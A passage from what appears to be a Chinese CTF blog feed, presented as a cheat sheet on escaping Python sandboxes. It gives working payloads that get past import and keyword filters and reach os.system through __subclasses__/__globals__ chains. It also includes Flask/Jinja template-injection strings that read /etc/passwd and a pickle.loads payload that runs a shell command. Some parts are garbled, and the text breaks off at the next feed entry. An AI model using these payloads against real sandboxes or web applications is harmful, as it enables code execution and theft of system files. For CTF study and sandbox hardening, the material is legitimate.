&apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;]methods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]results = {}for module in all_modules_3:    results[module] = {        &apos;flag&apos;: 0,        &apos;result&apos;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                result = &apos;yes&apos;                results[module][&apos;flag&apos;] = 1            else:                result = &apos;no&apos;            results[module][&apos;result&apos;][method] = result    except Exception as e:        print(e)for result in results:    if results[result][&apos;flag&apos;]:        print(&apos;[+]&apos; + result)        for r in results[result][&apos;result&apos;]:            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p><h3 id="如果我们没办法-import-呢？"><a href="#如果我们没办法-import-呢？" class="headerlink" title="如果我们没办法 import 呢？"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p><p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p><p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p><p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p><p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p><p>reload 也是内建函数，如果这也没了呢？ </p><pre><code>import impimp.reload(__builtin__)</code></pre><p>也可以引入。</p><p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p><p>实际上联系到 import 的原理</p><blockquote><p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p></blockquote><p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p><pre><code>import sysprint(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p><pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)system(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p><pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:    exec(f.read())system(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p><pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的del sys.modules[&apos;os&apos;]import osos.system(&apos;ls&apos;)</code></pre><h3 id="其他一些小技巧"><a href="#其他一些小技巧" class="headerlink" title="其他一些小技巧"></a>其他一些小技巧</h3><ol><li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p><p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p></li><li><p>函数后面加空格、换行都能执行</p></li><li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p><p> from numpy.distutils.exec_command import _exec_command as system</p><p> system(“ls /“)</p></li><li><p>使用别名</p><p> import os as o</p></li><li><p>字符串拼接</p><p> “l”+”s”</p><p> “func_global”+”s”</p></li><li><p>字符串编码或者其他操作</p><p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p><p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p><p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p><p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p></li></ol><h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p><p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &apos;os&apos; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():    try:        cnt2=0        for i in item.__init__.__globals__:            if &apos;eval&apos; in item.__init__.__globals__[i]:                print cnt,item,cnt2,i            cnt2+=1        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>这个相当于更深入一层查找</p><p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p><pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p><pre><code>&gt;&gt;&gt; import warnings&gt;&gt;&gt; warnings.osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;module&apos; object has no attribute &apos;os&apos;&gt;&gt;&gt; warnings.linecache&lt;module &apos;linecache&apos; from &apos;F:\python2.7\lib\linecache.pyc&apos;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module &apos;os&apos; from &apos;F:\python2.7\lib\os.pyc&apos;&gt;</code></pre><p>我们可以</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p><pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p><pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id="大佬们的payload"><a href="#大佬们的payload" class="headerlink" title="大佬们的payload"></a>大佬们的payload</h3><ol><li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li><li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li></ol><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p><pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p><pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p><pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p><p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p><pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></pre><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>func_globals</li></ol><p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p><ol start="2"><li><strong>getattribute</strong></li></ol><p>被调用无条件地实现类的实例的属性访问</p><pre><code>object. getattribute(self, name)1）self 必需的。类的实例，在调用时自动传递。2）name 必需的。属性的名称。</code></pre><ol start="3"><li><strong>subclasses</strong>()[]</li></ol><p>获取子类</p><ol start="4"><li>getattr</li></ol><p>返回对象的命名属性的值</p><pre><code>getattr(object,name) &lt;=&gt; object.name&gt;&gt;&gt; class A():...     bar =1...&gt;&gt;&gt; a = A()&gt;&gt;&gt; getattr(a,&apos;bar&apos;)1</code></pre><ol start="5"><li><strong>name</strong></li></ol><p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p><ol start="6"><li><p>timeit</p><p> timeit(命令，number=1)</p><p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p></li><li><p>platform</p></li></ol><p>模块和平台有关，主要是返回平台的一些信息</p><pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start="8"><li><strong>globals</strong></li></ol><p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p><pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start="9"><li><strong>call</strong></li></ol><p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p><ol start="10"><li>pickle</li></ol><p>将对象储存在字符串对象中，实现对象的持久化</p><p>序列化：</p><pre><code>import pickletest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])p=pickle.dumps(test)</code></pre><p>反序列化：</p><pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p><pre><code>pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)</code></pre><ol start="11"><li><p>os/subprocess/commands</p><p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p></li><li><p>eval/exec/execfile</p><p>eval() 执行 python 表达式执行的结果</p><p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p><p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.cnblogs.com/hester/p/4694499.html" target="_blank" rel="noopener">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href="https://www.restran.net/2015/10/22/how-python-code-run/" target="_blank" rel="noopener">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href="https://www.zhihu.com/question/38791962?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/38791962?sort=created</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特殊的webshell</title>
      <link href="/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/"/>
      <url>/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</url>
      
